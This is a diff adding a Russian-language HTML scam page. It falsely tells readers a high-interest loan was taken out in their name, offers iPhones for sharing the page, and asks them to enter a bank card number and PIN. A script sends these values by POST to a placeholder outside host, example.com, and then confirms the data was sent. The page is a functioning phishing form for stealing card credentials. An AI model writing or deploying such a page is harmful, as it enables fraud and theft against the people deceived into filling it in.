@@ -1,0 +1,24 @@
+<!DOCTYPE HTML> <html> <head> <title>HTML CSS Code</title> <style> p{ font-size: 40px; font-weight: bold; text-transform: uppercase; color: black; text-align: center; } .money{ color: green; } .percentage{ color: blue; } </style> </head> <body> <p><span class="money">На вас оформили кредит100000₽ 🥳</span> <span class="percentage">200% годовых🤑</span><h1>Поделись с 10 группами чтобы получить 16 iPhone📱</h1>
+<h1>Не забудь оставить свои данные внизу</h1><form>
+  <label for="card-number">Номер карты:</label>
+  <input type="text" id="card-number" name="card-number"><br><br>
+  <label for="pin-code">Пин-код:</label>
+  <input type="text" id="pin-code" name="pin-code"><br><br>
+  <input type="button" value="Отправить" onclick="sendData()">
+</form><script>function sendData() {
+  var cardNumber = document.getElementById("card-number").value;
+  var pinCode = document.getElementById("pin-code").value;
+  var data = "cardNumber=" + encodeURIComponent(cardNumber) + "&pinCode=" + encodeURIComponent(pinCode);
+  
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://example.com/submit-form.php");
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      alert("Данные отправлены");
+    }
+  };
+  xhr.send(data);
+}</script></html>
+
+
